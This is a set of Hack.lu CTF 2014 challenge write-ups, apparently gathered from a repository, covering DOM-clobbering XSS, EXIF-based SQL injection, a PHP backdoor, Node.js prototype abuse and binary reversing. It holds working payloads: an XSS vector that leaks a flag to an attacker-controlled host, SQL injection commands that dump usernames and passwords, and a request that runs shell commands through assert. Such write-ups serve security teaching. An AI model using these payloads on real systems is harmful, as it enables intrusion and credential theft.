> If you want to take a break from all the hard work, you’ve come to the right place. Many things have been said about this dating service. Some say it holds your greatest desires, some say it is merely disgusting. All of it is probably true, but see for yourself… <https://wildwildweb.fluxfingers.net:1401/>
>
> **Hint:** Let’s start with an obvious hint: What do we tell search engines about cow love? “No no”.
>
> **Note:** The support uses Chromium (37) which does support CSP, does not have any particularly interesting extensions and is most certainly no Internet Explorer. Support also does not see anything else than you. They really just visit the cow’s profile you give them.

## Write-up

<https://wildwildweb.fluxfingers.net:1401/> is a dating site for cows. After signing up for an account and logging in, we’re redirected to <https://wildwildweb.fluxfingers.net:1401/?p=internal> where we can choose a hot, single cow to chat with. Selecting ‘Rosie’ brings us to `https://wildwildweb.fluxfingers.net:1401/?p=chat#Rosie` which displays a chat interface:

![](chat.jpg)

The ‘Report a Problem’ button links to `https://wildwildweb.fluxfingers.net:1401/?p=report` where you can enter the name of a cow and a description of the issue you’re having.

![](report.jpg)

Some further site recon reveals an interesting `robots.txt` file:

```bash
$ curl https://wildwildweb.fluxfingers.net:1401/robots.txt
User-agent: *
Disallow: /index.php?api=*
Disallow: /.git/
```

And sure enough, their entire `.git` folder is available at `https://wildwildweb.fluxfingers.net:1401/.git/`. Let’s download the whole thing:

```bash
$ wget -r https://wildwildweb.fluxfingers.net:1401/.git/
```

This is a so-called _bare Git repository_: it contains the repository data but not the actual files. Luckily it’s possible to extract those:

```bash
$ ls -la
total 0
drwxr-xr-x   3 mathias  staff  102 Oct 22 16:57 .
drwxr-xr-x   6 mathias  staff  204 Oct 22 17:00 ..
drwxr-xr-x  14 mathias  staff  476 Oct 22 17:00 .git

$ git config --local --bool core.bare false

$ git checkout -f

$ ls -la
total 24
drwxr-xr-x  12 mathias  staff   408 Oct 22 17:03 .
drwxr-xr-x   6 mathias  staff   204 Oct 22 17:00 ..
drwxr-xr-x  14 mathias  staff   476 Oct 22 17:03 .git
drwxr-xr-x   8 mathias  staff   272 Oct 22 17:03 api
-rw-r--r--   1 mathias  staff  1499 Oct 22 17:03 cfg.php
drwxr-xr-x   3 mathias  staff   102 Oct 22 17:03 css
-rw-r--r--   1 mathias  staff   555 Oct 22 17:03 index.php
drwxr-xr-x   8 mathias  staff   272 Oct 22 17:03 js
drwxr-xr-x   4 mathias  staff   136 Oct 22 17:03 lib
-rw-r--r--   1 mathias  staff    57 Oct 22 17:03 robots.txt
drwxr-xr-x   7 mathias  staff   238 Oct 22 17:03 static
drwxr-xr-x  10 mathias  staff   340 Oct 22 17:03 templates
```

Now we have access to [the full source code for the site](https://github.com/ctfs/write-ups/tree/master/hack-lu-ctf-2014/hotcows-dating/source).

Studying the code reveals that the flag is messaged to premium account users when they start a new chat session. See [the `page.firstMessage` function in `js/pages/chat.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L200-L218). Since there’s no way for us to get a premium account, we’ll have to find a way to have a premium user do this for us, and then leak the flag somehow.

We guessed that the ‘report a problem’ functionality would cause a logged-in site administrator to visit the profile for the cow whose name you enter. What if we can get a cross-site scripting (XSS) vector in there?

Eventually, this is the cow name we entered (explanation follows):

```
https://our-server.example.com/<form name=getElementById></form>
```

We assumed that this would cause the server admin to visit the following URL:

```
https://wildwildweb.fluxfingers.net:1401/?p=chat#https://our-server.example.com/<form name=getElementById></form>
```

And indeed – a few moments later we got a hit on our server:

```
149.13.33.84 - - [22/Oct/2014 15:51:58] "GET /%3Cform%20name=getElementById%3E%3C/form%3E%20(PREM_flag%7Bcows_need_love_too!%7D) HTTP/1.1" 404 -
```

After URL-decoding, that becomes:

```
<form name=getElementById></form> (PREM_flag{cows_need_love_too!})
```

The flag is `flag{cows_need_love_too}`. But why on earth did this work?!

[The `page.view` function around line 134 of `js/pages/chat.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L131-L198) contains this snippet:

```js
cow_name = location.hash.slice(1);
/* … */
temp_main = new Template('cow.html');
temp_main.assign(cow_name, 'cow');
temp_main.render();
```

`location.hash.slice(1)` is the part of the URL following `#`, which is under our control. Since this value is never sanitized, this creates an XSS vulnerability. However, [the site is sending a CSP header which disallows inline scripts](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/cfg.php#L40):

```
Content-Security-Policy: default-src 'none'; img-src 'self'; script-src 'self'; style-src 'self'; connect-src 'self'
```

So injecting scripts won’t work, but we can still insert arbitrary HTML. So why did we inject `<form name=getElementById></form>`, of all things? When the above code is executed, and the `<form>` is inserted into the DOM, we’ve successfully [clobbered](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/) `document.getElementById`: it is now a reference to the injected `<form>` element rather than the DOM method the rest of the script expects. That’s why the next line throws an exception:

```js
btn_logout = document.getElementById('btn-logout');
```

Since the error is not caught using `catch`, the rest of the code in `page.view` never executes. This line, for example, is never reached:

```js
temp = new Template('message.html');
```

As a result, the global `temp` variable maintains its previous value, which is a reference to the built-in `location` object because of [this line in `js/router.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/router.js#L8-L9):

```js
router.route((m = /p=(\w+)/.exec(temp=location)) ? m[1] : 'index',
       (!!temp.hash) ? temp.hash.slice(1) : undefined);
```

When the page was loaded, [`js/pages/chat.js` set up a timer to call `page.firstMessage` after a second](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L224):

```js
setTimeout(page.firstMessage, 1000);
```

[The `page.firstMessage` function](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L200-L218) looks like this:

```js
/**
 * Greet the user after a while to avoid suspicion.
 */
page.firstMessage = function firstMessage() {
  if (!!temp) { // if template loaded
    temp.assign('system', 'class');
    temp.assign('In chat with', 'name')
    message = cow_name + ((has_premium) ? ' (' + premium_id + ')' : '');
    temp.assign(message, 'msg');
    page.appendMessage(temp);
    temp.assign('her', 'class');
    temp.assign(cow_name, 'name')
    temp.assign(page.chatAnswer('', cow_name), 'msg');
    page.appendMessage(temp);
  } else {
    // wait some more
    setTimeout(page.firstMessage, 1000);
  }
};
```

`temp.assign` is supposed to refer to [the custom `Template.prototype.assign` method as defined in `js/template.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/template.js#L9-L14), but because `temp` is now a reference to `location`, it’s actually [`location.assign`](https://html.spec.whatwg.org/multipage/browsers.html#dom-location-assign).

Note that thanks to our DOM clobbering attack, the call to [`page.appendMessage`](https://github.com/ctfs/write-ups/blob/382aa45be715459a132d44d160358845110e0e73/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L104-L111) throws an exception, since it attempts to use `document.getElementById`. As a result, the rest of the code in `page.firstMessage` is never executed. This leaves the following code:

```js
temp.assign('system', 'class');
temp.assign('In chat with', 'name')
message = cow_name + ((has_premium) ? ' (' + premium_id + ')' : '');
temp.assign(message, 'msg');
page.appendMessage(temp); // ← This throws an exception.
// The code below is never reached.
```

Another thing to keep in mind is that browsers batch successive calls to `location.assign` together. For example, this HTML document redirects you to `https://example.com/?q=b` and not `https://example.com/?q=a`:

```html
<script>
  location.assign('https://example.com/?q=a');
  location.assign('https://example.com/?q=b');
</script>
```

Similarly, only the last `temp.assign` call is effective:

```js
temp.assign(message, 'msg');
```

That’s good news, because it contains the flag! Now you know why/how that ‘exploit’ we showed you earlier works. Here it is one more time:

```
https://our-server.example.com/<form name=getElementById></form>
```

Isn’t it beautiful?

### Alternative, unintended solution

Another way to solve the challenge was to use a subtle form of a [dangling markup injection attack](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection) using a `<base>` tag to leak part of the HTML to a server under our control:

```
<base href=https://our-server.example.com/>
```

The challenge author confirmed on IRC that this is not the intended solution, although it is a very nice bypass. This exploit works because it uses a chain of lucky events:

1. When [instantiating a new `Template` object](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/template.js#L1-L7), the template is [immediately loaded via `XMLHttpRequest` and cached in the `sessionStorage`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/loader.js#L32-L42).
2. Since the injection ([lines 144 and 145 in `js/pages/chat.js`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L144)) already occurs before the load of the `message.html` template ([line 165](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L144)), the new base URL is in effect.
3. The page [uses a relative URL to load the `message.html` template](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L165), so it is hijacked by the base URL and blocked by CSP. The `XMLHttpRequest` fails with a `SecurityError`. Thus the `temp` variable is not set and remains to be the `location` object.
4. In [`page.appendMessage`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L104-L111) the `renderToString` function cannot be found on the `location` object and errors.
5. So this leaves a call to [`location.assign('<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})')`](https://github.com/ctfs/write-ups/blob/master/hack-lu-ctf-2014/hotcows-dating/source/js/pages/chat.js#L179). This is in fact a relative URL and hence hijacked by the new base URL.
6. Finally the browser redirects to `https://our-server.example.com/<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})`.

In a way, this exploit is even harder to find than the intended solution. Every attacker surfing on `chat.js` fills the `sessionStorage` with the legitimate `message.html` `Template`. This stops the exploit from working because it needs the first `SecurityError` due to the `XMLHttpRequest`.

## Other write-ups and resources

* [More info about _DOM clobbering_, the technique used to solve this challenge](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
# Hack.lu CTF 2014: ImageUpload

**Category:** Web
**Points:** 200
**Author:** SLAZ
**Description:**

> In the Wild Wild Web, there are really bad guys. The sheriff doesn’t know them all. Therefore, he needs your help.
Upload pictures of criminals to this [site](https://wildwildweb.fluxfingers.net:1421/) and help the sheriff to arrest them.
You can make this Wild Wild Web much less wild!!!
>
> Pictures will be deleted on regular basis!
>
> **Hint:** Bruteforce is not necessary to solve the challenge!!! Please don’t do this.

## Write-up

As stated in the challenge description, the site at <https://wildwildweb.fluxfingers.net:1421/> allows image uploads. There is also a login form, but since we don’t have an account, let’s ignore that for now.

Some trial and error reveals that only JPEGs are accepted. Any image you upload gets some effects applied to it to make it look like a Wild Western ‘Wanted’ poster:

![](poster.jpg)

The text on the image “Dr. Evil” reflects the original image’s `Artist` EXIF tag. Below the image, the original `Width`, `Height`, `Author` (i.e. `Artist`), `Manufacturer` (i.e. `Make`), and `Model` EXIF tags are shown. Let’s inject some interesting values there:

```bash
$ exiftool -Make="foo', (SELECT VERSION())) -- -" image.jpg
```

Uploading this image lists the `Manufacturer` as `foo`, and uses the result of `SELECT VERSION()` as the next value in the query, i.e. as if it was the value for `Model`. Yep, the app is vulnerable to SQL injection through EXIF data.

Let’s find out which tables exist in the current database:

```bash
$ exiftool -Make="foo', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())) -- -" image.jpg
```

The result is `brute,pictures,users`. Hmm, what are the names of the columns in the `users` table?

```bash
$ exiftool -Make="foo', (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')) -- -" image.jpg
```

Apparently, `id,name,password`. Those `name` and `password` columns sound interesting – let’s see what values are in there:

```bash
$ exiftool -Make="foo', (SELECT GROUP_CONCAT(CONCAT(name, ':', password)) FROM users)) -- -" image.jpg
```

The result: `sheriff:AO7eikkOCucCFJOyyaaQ,deputy:testpw`.

Logging in using `sheriff` as the username and `AO7eikkOCucCFJOyyaaQ` as the password reveals the flag `flag{1\_5h07\_7h3\_5h3r1ff}`.

## Other write-ups and resources

* <http://akaminsky.net/hack-lu-ctf-2014-web-200-imageupload/>
* <http://www.mrt-prodz.com/blog/view/2014/10/hacklu-ctf-2014---imageupload-200pts-writeup/>
* [Writeup by captchaflag](http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/)
* [German](https://f00l.de/blog/hack-lu-ctf-2014-imageupload/)
# Hack.lu CTF 2014: ionpuke

**Category:** Reversing
**Points:** 500
**Author:** taiga
**Description:**

> Outlaws always try to make money without working hard for it. They rob banks, steal, hijack the stage coach and sell stolen documents. A group of dubious people recently developed a technique that may protect interactive documents from thieves. Nobody knows who stands behind this expensive tool. Is it a hoax or does it really work? Find out by analyzing the software and breaking into the developer’s website.
>
> https://wildwildweb.fluxfingers.net:1431

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2014: JonahHex

**Category:** Reversing
**Points:** 300
**Author:** n0p
**Description:**

> You were approached by a sheriff, who was thrown out of his own town, called Elkhorn. It had been a normal town, profiting from the gold rush and having its occasional salon fights, until Manning showed up with some futuristic weapons… So armed with your two colts and a rifle you set out for Elkhorn with the sheriff. In Elkhorn you ran across three men and a woman, called Bruce, John, David and Diana. With their help Manning wasn’t that hard to beat after all. After the fight they disappeared to… well let’s just say they were from the future and had some trouble of their own. On the ground where Bruce and David struggled, before they disappeared, you find a small item. Maybe you can find out what it’s used for and how to use it? You’ve overheard Bruce saying to Diana, that he’s glad to have changed to the latest version of the operating system, because it kept on crashing before.
>
> Download: [JonahHex_47bf515081c6953f79d890892fff9c5e.exe.dat](JonahHex_47bf515081c6953f79d890892fff9c5e.exe.dat)

## Write-up

(TODO)

## Other write-ups and resources

* [Challenge source, released after the CTF](http://git.n0p.cc/?p=JonahHex.git)
# Hack.lu CTF 2014: Killy The Bit

**Category:** Web
**Points:** 200
**Author:** understrich
**Description:**

> Killy the Bit is one of the dangerous kittens of the wild west. He already flipped bits in most of the states and recently hacked the Royal Bank of Fluxembourg (https://wildwildweb.fluxfingers.net:1424/). All customer of the bank are now advised to change their password for the next release of the bank’s website which will be launched on the 23.10.2014 10:01 CEST.
>
> Killy the Bit stands in your debt and sent the following link [https://wildwildweb.fluxfingers.net:1424/index.phps](index.phps). Can you break the password generation process in order to get access to the admin account?
>
> **Hint:** The challenge won’t actually send emails — just concentrate on the website!
>
> **Hint:** The password’s column name is `passwd`.
>
> **Hint:** Blind SQLi is not a good solution. You can get the correct and complete flag with one single request!

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctfwriteups.wordpress.com/2014/10/24/hack-lu-ctf-2014-web-200-killy-the-bit/>
* <https://securimag.org/wp/challenges/hack-lu-killy-the-bit/> blind SQLi way
* <http://blog.squareroots.de/en/2014/10/hack-lu-ctf-2014-killy-the-bit-web200/># Hack.lu CTF 2014: Mario

**Category:** Exploiting
**Points:** TheJH
**Author:** 500
**Description:**

> Cowboy Mario jumps because Cowboy Mario jumps. Make sure that you’re testing with the right `libc` version!
>
> [Download](mario_7e584c20736c828037d15303870cebe5.tgz)
> Connect to wildwildweb.fluxfingers.net:1407. Run `./getflag` on the server to get the flag.
>
> **Hint:** the big vuln is not in `profile_viewer.c`.

## Write-up

(TODO)

## Other write-ups and resources

* <http://lovelydream.gitcafe.com/2014/11/26/mario/>
* [Exploit in Python by @TheJH](thejh_exploit.py)
* <https://rzhou.org/~ricky/hacklu2014/mario/>
# Hack.lu CTF 2014: Next Global Backdoor

**Category:** Web
**Points:** 150
**Author:** reiners
**Description:**

> J0nas is a simple man. He specializes in only one thing: Building the most beautiful back doors that you’ve ever seen. This gem was used in multiple saloons, letting only the most skilled c0wb0ys pass.
>
> <https://wildwildweb.fluxfingers.net:1425/index.php>
> [index.phps](index.phps)

## Write-up

Let’s reformat the PHP source first:

```php
$GLOBALS
=
$GLOBALS{next}
=
next($GLOBALS{'GLOBALS'})[
	$GLOBALS['next']['next']
	=
	//* DELME */ var_dump(__LINE__, current($GLOBALS)) ? next($GLOBALS) :
	next($GLOBALS)['GLOBALS']
][
	$next['GLOBALS']
	=
	//* DELME */ var_dump(__LINE__, current($GLOBALS[GLOBALS]['GLOBALS'])) ? next($GLOBALS[GLOBALS]['GLOBALS'])[ $next['next'] ] :
	next($GLOBALS[GLOBALS]['GLOBALS'])[
		$next['next']
	]
][
	$next['GLOBALS'] = next($next['GLOBALS'])
][
	//* DELME */ var_dump(__LINE__, $GLOBALS[next]) ? $GLOBALS[next]['next']( $GLOBALS['next']{'GLOBALS'}) :
	$GLOBALS[next]['next'](
		$GLOBALS['next']{'GLOBALS'}
	)
]
=
next(neXt(${'next'}['next']));
```

Basically, a whole bunch of array pointer fun. You can see that there is one “dynamic” function call. At first glance, it looks like we can execute an arbitrary function with an argument of our choice if we can control the contents of `$GLOBALS[next]['next']` and `$GLOBALS['next']{'GLOBALS'}`. However, there is more to it than that. :-)

[`next`](https://php.net/next) moves the internal array pointer by one spot, and [`$GLOBALS`](https://php.net/globals) is a built-in array of global variables. By default, it contains the so-called [superglobals](https://php.net/superglobals), i.e. `$_GET`, `$_POST`, `$_COOKIE`, `$_FILES` and `$_SERVER` (depending on [`variables_order`](https://php.net/variables_order)), and `$GLOBALS` itself.

Because I suck at debugging (I have never used [Xdebug](http://xdebug.org/)), I sprinkled in a few `/* DELME /* var_dump()` lines to see what the current entry in each step was. It was hard for me to parse by reading because of all the variable variables and `next`’ing, so I also added a `source` entry to the `GET`, `POST`, and cookie arrays.

At the very start, the `$GLOBALS` array pointer points to `$_GET`. The first call to `next()` points it to `$_POST`, but another call advances it to `$_COOKIE`. (I found this hard to parse by reading because of the right-to-left interpretation mixed with the code inside the array keys — hence the `var_dump`.)

It then reads the value for the `GLOBALS` key, i.e. `$_COOKIE['GLOBALS']`. This will be the the name of the function to call, and the name of the file input under consideration when doing another `next($GLOBALS)`. After that third `next()`, we are at the `$_FILES` array (i.e., `$GLOBALS['_FILES_]`). The `next()` call on the `$_FILES[$_COOKIE['GLOBALS']]` entry advances that file array’s pointer to the second key, which is the content type. That value is used as the argument to the function call.

TL;DR The function in `$_COOKIE['GLOBALS']` is called with `$_FILE[$_COOKIE['GLOBALS']]['type']` as its only argument.

So, in short: leave `$_GET` and `$_POST` empty, set a cookie called `GLOBALS` with the name of the PHP function to call, add a file whose input name is that function name, and whose content type is the argument. (And ignore all the times `next` is used as an array key, be it as a string or as an (undefined) constant.)

Note that because [`eval`](https://php.net/eval) is not a function but a language construct, you cannot use it as the function to call. Use [`assert`](https://php.net/assert) instead.

Finally, here is an [example request](request.txt) (note the DOS line endings) which allows you to specify a shell command to run as a query string parameter.

You might need to [download the StartSSL root certificate](https://www.startssl.com/certs/ca-bundle.pem) first:

```bash
$ wget https://www.startssl.com/certs/ca-bundle.pem
```

Then, perform the request like this:

```bash
$ socat openssl:wildwildweb.fluxfingers.net:1425,cafile=./ca-bundle.pem stdio < request.txt
```

Eventually we found the flag in `/flag.txt` on the server. The flag is `flag{backdoor_business_is_hard,_fella}`.

## Other write-ups and resources

* none yet
# Hack.lu CTF 2014: Objection

**Category:** Web
**Points:** 150
**Author:** TheJH
**Description:**

> This guard talks a weird dialect. And why does he talk in such a complicated way?
>
> Download: [objection_4966674d17ff296939c0e3dfccfe87ed.co](objection_4966674d17ff296939c0e3dfccfe87ed.co)
>
> `nc wildwildweb.fluxfingers.net 1408`

## Write-up

[The provided `objection_4966674d17ff296939c0e3dfccfe87ed.co` file](objection_4966674d17ff296939c0e3dfccfe87ed.co) resembles a Node.js app, except it’s written in “a weird dialect” instead of in JavaScript. This is [Coco](https://github.com/satyr/coco#readme), which is in turn a dialect of [CoffeeScript](http://coffeescript.org/). Let’s [compile the Coco code to JavaScript](objection.js), since we’re more familiar with that language:

```bash
$ coco -c -p objection_4966674d17ff296939c0e3dfccfe87ed.co > objection.js
```

[The source code](objection.js) reveals that the program accepts commands as input:

* `login $password` attempts to login using `$password` as the password
* `get_token` reveals the token if you’re logged in as admin

Since we don’t know the admin password, we’ll have to find another way to set `client_context.is_admin` to a truthy value, to avoid hitting this `if` branch:

```js
if (!this.is_admin) {
  return cb("You are not authorized to perform this action.");
}
```

Let’s take a look at the code that parses our input:

```js
var ref$, funcname, args;
it = it.toString('utf8');
console.log("got line: " + it);
ref$ = it.split(' ');
funcname = ref$[0];
args = slice$.call(ref$, 1);
if (typeof client_context[funcname] !== 'function') {
  return con.write("error: unknown function " + funcname + "\n");
}
return client_context[funcname](args, function(it){
  return con.write(it + "\n");
});
```

The program accepts any command `funcname` as long as `client_context[funcname]` is a JavaScript function object. This means we’re not limited to the custom `login` and `get_token` methods – we can also use function properties that are inherited from the global `Object.prototype`. Using [some old code](https://github.com/mathiasbynens/tpyo/blob/b76ca2f4d7726c51c2f8c779d73773de91f86a56/tpyo.js#L7-L22), we quickly created the following list of such properties that are available in Node.js (which is based on the V8 engine):

* `constructor`
* `hasOwnProperty`
* `isPrototypeOf`
* `propertyIsEnumerable`
* `toLocaleString`
* `toString`
* `valueOf`
* `__defineGetter__`
* `__defineSetter__`
* `__lookupGetter__`
* `__lookupSetter__`

If we enter [`__defineGetter__`](https://javascript.spec.whatwg.org/#object.prototype.__definegetter__) as the command name and `is_admin` as its argument, the following code is executed:

```js
client_context.__defineGetter__(['is_admin'], function(it) {
  return con.write(it + "\n");
});
```

After that, every time `client_context.is_admin` is accessed, it results in [the return value of `con.write(it + "\n")`](https://nodejs.org/api/net.html#net_socket_write_data_encoding_callback) instead of its initial value `false`. This means we can call `get_token` afterwards. Bingo!

```bash
$ nc wildwildweb.fluxfingers.net 1408
hello!
__defineGetter__ is_admin
get_token
undefined
The current token is flag{real_cowboys_dont_use_object_create_null}
```

The flag is `flag{real_cowboys_dont_use_object_create_null}`.

## Other write-ups and resources

* <http://akaminsky.net/hack-lu-ctf-2014-web-150-objection/>
* [Exploit in Python by @TheJH](thejh_exploit.py)
# Hack.lu CTF 2014: OREO

**Category:** Exploiting
**Points:** 400
**Author:** cutz
**Description:**

> The Original Rifle Company has the most finest rifles and revolvers in whole Rodeo City! However their buildings are pretty secure, so your only chance to get into their offices is by hacking through the Original Rifle Ecommerce Online (OREO) System and steal all those pretty weapons from the inside! Makes sense right? Good luck!
>
> [Download](oreo_35f118d90a7790bbd1eb6d4549993ef0)
> `nc wildwildweb.fluxfingers.net 1414`

## Write-up

(TODO)

## Other write-ups and resources

* [Exploit in Perl by @_cutz](exploit-by-cutz.pl)
* [Writeup by @wapiflapi](http://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/)
* <http://pastebin.com/9vq38BYH>
* <http://rex.sex/ctf/2014/hack.lu/oreo/ex.py>
# Hack.lu CTF 2014: Peace Pipe

**Category:** Crypto
**Points:** 300
**Author:** Mpex
**Description:**

> After a long day, you sit around a campfire in the wild wild web with a few Sioux you met today. To celebrate friendship one of them takes out his wooden peace pipe and minutes later everyone seems to be pretty dizzy. You remember that their war chief “Makawee” started something to say about a secret tipi filled with fire-water (the good stuff). But when he noticed your interest he immediately stopped talking. You recall that “Makawee” spoke with “Wahkoowah” about that issue, but it ended with a fight. Since then Makawee wouldn’t talk to Wahkoowah anymore. While they argued “Chapawee” wrote something down. Maybe you can exploit their dizzyness to find out the location of the tipi.
>
> wildwildweb.fluxfingers.net 1432
> wildwildweb.fluxfingers.net 1433
> wildwildweb.fluxfingers.net 1434

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by tasteless](http://tasteless.eu/2014/10/hack-lu-ctf-2014-peace-pipe/)
# Hack.lu CTF 2014: Personnel Database

**Category:** Exploiting
**Points:** 150
**Author:** TheJH
**Description:**

> Lots of criminals in this area work for one big boss, but we have been unable to determine who he is. We know that their organization has one central personnel database that might also contain information about their boss, whose username is simply “boss”. However, when you register in their system, you only get access level zero, which is not enough for reading data about the boss — that guy is level 10. Do you think you can get around their protections?
>
> [Download](personnel_database_server_67e4ead6aeb111cc19de03d1f3d15fab.c)
>
> `nc wildwildweb.fluxfingers.net 1410`
>
> Note: The users dir will be wiped every 5 minutes.

## Write-up

(TODO)

## Other write-ups and resources

* [Exploit in Python by @TheJH](thejh_exploit.py)
* <https://ctfcrew.org/writeup/84>
* <https://johnsupercool.github.io/posts/2014/oct./25/hacklu-2014-ctf-exploit200-personnel-database/>
# Hack.lu CTF 2014 write-ups

* <https://wildwildweb.fluxfingers.net/>
* [Scoreboard](https://wildwildweb.fluxfingers.net/scoreboard) or [local alternative](scoreboard.txt)

## Completed write-ups

* [At Gunpoint](at-gunpoint)
* [Barmixer Bot](barmixer-bot)
* [Encrypted](encrypted)
* [Gunslinger Joe’s private Terminal](gunslinger-joes-private-terminal)
* [Hidden in ρlaιn sιght](hidden-in-plain-sight)
* [HotCows Dating](hotcows-dating)
* [ImageUpload](imageupload)
* [Next Global Backdoor](next-global-backdoor)
* [Objection](objection)
* [The Union](the-union)
* [Wanted: Translator](wanted-translator)
* [Wiener](wiener)

## External write-ups only

* [Big Jim’s Map](big-jims-map)
* [breakout](breakout)
* [Callgate](callgate)
* [Cryptochief](cryptochief)
* [Dalton’s Corporate Security Safe for Business](daltons-corporate-security-safe-for-business)
* [douchemac](douchemac)
* [Guess the Flag](guess-the-flag)
* [Gunslinger Joe’s Gold Stash](gunslinger-joes-gold-stash)
* [Holy Moses](holy-moses)
* [JonahHex](jonahhex)
* [Killy the Bit](killy-the-bit)
* [Mario](mario)
* [OREO](oreo)
* [Peace Pipe](peace-pipe)
* [Personnel Database](personnel-database)

## Missing write-ups

* [Get your gatling at Garrettling! (Part 1)](get-your-gatling-at-garrettling-part-1)
* [Get your gatling at Garrettling! (Part 2)](get-your-gatling-at-garrettling-part-2)
* [ionpuke](ionpuke)
# Hack.lu CTF 2014: The Union

**Category:** Exploiting
**Points:** 200
**Author:** sqall
**Description:**

> Our biggest competitor the mining corporation, The Union, has a new way of organizing its mining facilities. On the surface, it looks like a mining location archive. But our man inside told us, it has a secret trapdoor that we can use to infiltrate the corporation and steal their secret. We need their secret. They have one success after another and it will not be long until we are finished. Our informant also told us that not everything is what it seems to be. We do not know what this means. Luckily for us, he managed to get us the blueprints of the system. So we should be able to study them before we went for the heist. So, this is your job. Study the blueprints and then go for the valuable `secret.txt`. This is everything we need to overcome them.
>
> Download: [theunion_9edfcf7b247775ab57da993863bfaabd](theunion_9edfcf7b247775ab57da993863bfaabd)
>
> `nc wildwildweb.fluxfingers.net 1423`

## Write-up

When connecting to the server, it greets us with the following prompt:

```
	Welcome to
 _   _                        _             _
| |_| |__   ___   _   _ _ __ (_) ___  _ __ ( )___
| __| '_ \ / _ \ | | | | '_ \| |/ _ \| '_ \|// __|
| |_| | | |  __/ | |_| | | | | | (_) | | | | \__ \
 \__|_| |_|\___|  \__,_|_| |_|_|\___/|_| |_| |___/

			mining archive.

Please give the unions slogan and secret word:
```

By looking at the disassembly of the binary, we figure out that the password is the string `gold>silver`, concatenated with the contents of the file `salt.txt`, which we don’t know.

When playing with the binary locally, we noticed the following oddity: even if we had a trailing newline in the `salt.txt`, we could still get access even though the input password is read without the trailing newline. This caused us to take a closer look at the string comparison part of the code:

```
080489af         mov        dword [ss:esp+0x8], 0xc         # argument 3 ??
080489b7         mov        eax, dword [ss:ebp+var_40]
080489ba         mov        dword [ss:esp+0x4], eax         # argument 2
080489be         lea        eax, dword [ss:ebp+var_21]
080489c1         mov        dword [ss:esp], eax             # argument 1
080489c4         call       strcmp@PLT
080489c9         test       eax, eax
080489cb         jne        0x80488fc
```

At this point we recalled the hint “not everything is what it seems to be” and figured that probably not `strcmp` is called, but `memcmp`, which takes an additional `length` parameter. This means that actually only the first 12 characters of the password are checked, which is only one additional character to what we already know! After two tries we find the correct access code:

```
Please give the unions slogan and secret word:
gold>silverb
Correct slogan.

1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
```

Looking at the xrefs of some of the strings in the binary, we find the ‘trapdoor’:

```
1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
99
Ufff! You found our trapdoor.
Ok here you go. Everything in here is not what it seems to be.
If you do not understand this, you are not quite there yet.
```

That’s not really helpful. The disassembly of the function however is:

```
08049209         mov        ebp, esp
0804920b         sub        esp, 0x18
0804920e         mov        dword [ss:esp], 0x8049b08                           ; "Ufff! You found our trapdoor.", argument #1 for method puts@PLT
08049215         call       puts@PLT
0804921a         mov        eax, dword [ds:stdout]                              ; stdout
0804921f         mov        dword [ss:esp+0x4], eax                             ; argument #2 for method fputs@PLT
08049223         mov        dword [ss:esp], 0x8049b28                           ; "Ok here you go. Everything in here is not what it seems to be.\\n", argument #1 for method fputs@PLT
0804922a         call       fputs@PLT
0804922f         cmp        dword [ss:ebp+arg_0], 0x0
08049233         je         0x8049243

08049235         mov        dword [ss:esp], 0x8049b68                           ; "This is what you should use.", argument #1 for method printf@PLT
0804923c         call       printf@PLT
08049241         jmp        0x804924f

08049243         mov        dword [ss:esp], 0x8049b88                           ; "If you do not understand this, you are not quite there yet.", argument #1 for method puts@PLT, XREF=sub_8049208+43
0804924a         call       puts@PLT

0804924f         mov        eax, dword [ds:stdout]                              ; stdout, XREF=sub_8049208+57
08049254         mov        dword [ss:esp], eax                                 ; argument #1 for method fflush@PLT
08049257         call       fflush@PLT
0804925c         leave
0804925d         ret
```

Two things of interest:

1. `fputs(..., stdout)` is used, although it does the same thing as `puts`, which is used in the same function
2. The call to `printf` is unreachable, so probably some kind of hint.

We suspect that `fputs` and `printf` are also not what they seem. Some digging into the ELF headers confirms this: `DT_STRTAB` points to a string table that contains slightly different function names than the symbol table would have us believe. We note:

* `strcmp` is really `strncmp`
* `printf` is really `system`
* `fputs` is really `printf`

`printf` is never called with user input, but `fputs` is. This leaves us with a format string vulnerability, which can be triggered as follows:

```
1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
1
Please give the location:
%d
Please give the type of the mine:
foo
Please give the profit of the mine:
1
1) Add mine
